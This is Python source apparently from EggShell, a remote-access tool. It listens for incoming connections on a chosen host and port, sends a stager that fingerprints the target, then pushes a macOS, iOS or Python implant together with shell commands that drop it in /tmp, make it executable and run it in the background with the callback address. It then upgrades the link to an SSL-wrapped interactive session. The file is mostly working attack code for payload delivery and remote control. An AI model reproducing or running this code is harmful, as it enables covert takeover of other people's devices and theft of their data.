import socket, ssl, os, json, sys
import helper as h
import session
import binascii
import readline

downloads_dir = "../downloads"

class Server:
    def __init__(self):
        if not os.path.isdir("downloads"):
            os.makedirs("downloads")
        self.host = None
        self.port = None
        self.debug = False
        self.debug_device = ""
        self.modules_macos = self.import_modules("modules/commands/macOS")
        self.modules_ios = self.import_modules("modules/commands/iOS")
        self.modules_python = self.import_modules("modules/commands/python")
        self.modules_local = self.import_modules("modules/commands/local")

  
    def import_modules(self,path):
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).command()
                #add module info to dictionary
                modules[m.name] = m
        return modules


    def get_modules(self,session):
        if session.device == "i386": 
            result = self.modules_macos
        elif session.device == "arm64":
            result = self.modules_ios
        else:
            result = self.modules_python
        return result


    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
            if choice != "":
                lhost = choice
            h.info_general("LHOST = " + lhost)
            while True:
                lport = raw_input("SET LPORT (Leave blank for 4444)>")
                if not lport:
                    lport = 4444
                try:
                    lport = int(lport)
                except ValueError:
                    h.info_general("invalid port, please enter a valid integer")
                    continue
                if lport < 1024:
                    h.info_general("invalid port, please enter a value >= 1024")
                    continue
                break
            h.info_general("LPORT = " + str(lport))
            self.host = socket.gethostbyname(lhost)
            self.port = lport
            return True
        except KeyboardInterrupt:
            return False


    def single(self):
        session = self.listen(False)
        if session:
            session.interact()
        else:
            print "rip"


    def craft_payload(self,device):
        if not self.host:
            raise ValueError('Server host not set')
        if not self.port:
            raise ValueError('Server port not set')
        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":1}))
        if device == "i386":
            h.info_general("Detected macOS")
            f = open("resources/esplmacos", "rb")
            payload = f.read()
            f.close()
            #save to tmp, 
            instructions = \
            "cat >/private/tmp/tmpespl;"+\
            "chmod 777 /private/tmp/tmpespl;"+\
            "killall espl 2>/dev/null;"+\
            "mv /private/tmp/tmpespl /private/tmp/espl;"+\
            "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        elif device == "arm64":
            h.info_general("Detected iOS")
            f = open("resources/esplios", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/tmpespl;"+\
            "chmod 777 /tmp/tmpespl;"+\
            "killall espl;"+\
            "mv /tmp/tmpespl /tmp/espl;"+\
            "/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        else:
            if "Linux" in device:
                h.info_general("Detected Linux")
            elif "GET / HTTP/1.1" in device:
                raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
            else:
                h.info_general("Device unrecognized, trying python payload")
            f = open("resources/espl.py", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/espl.py;"+\
            "chmod 777 /var/tmp/espl.py;"+\
            "python /tmp/espl.py "+payload_parameter+" &\n"
            return (instructions,payload)


    def listen(self,is_multi,verbose=True):
        #craft shell script
        INSTRUCT_ADDRESS = "/dev/tcp/"+self.host+"/"+str(self.port)
        
        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        #listen for connection
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1)
        if verbose:
            h.info_general("Listening on port "+str(self.port)+"...")

        #SEND/RECEIVE ARCH
        conn, addr = s.accept()
        hostAddress = addr[0]
        if verbose:
            h.info_general("Connecting to "+hostAddress)
        conn.send(INSTRUCT_STAGER)
        device_type = conn.recv(128).strip()
        
        try:
            preload, payload = self.craft_payload(device_type)
        except Exception as e:
            h.info_error(str(e))
            raw_input("Press the enter key to continue")
            return
        
        h.info_general("Sending Payload")
        conn.send(preload)
        conn.send(payload)
        conn.close()
        h.info_general("Establishing Secure Connection...")
        return self.listen_espl(s,device_type)


    def listen_espl(self,s,device_type):
        # accept connection
        ssl_con, hostAddress = s.accept()
        s.settimeout(5)

        ssl_sock = ssl.wrap_socket(ssl_con,
                                 server_side=True,
                                 certfile=".keys/server.crt",
                                 keyfile=".keys/server.key",
                                 ssl_version=ssl.PROTOCOL_SSLv23)

        device_name = ssl_sock.recv(50)
        if device_name:
            name = h.UNDERLINE_GREEN + device_name + h.ENDC + h.GREEN + "> " + h.ENDC;
            return session.Session(self,ssl_sock,name,device_type)
        else:
            h.info_general("Unable to get computer name")
            raw_input("Press Enter To Continue")
    

    def update_session(self,session):
        #single session
        newsession = self.listen(False,True)
        session.is_multi = newsession.is_multi
        session.term = newsession.term
        session.conn = newsession.conn
        session.name = newsession.name


   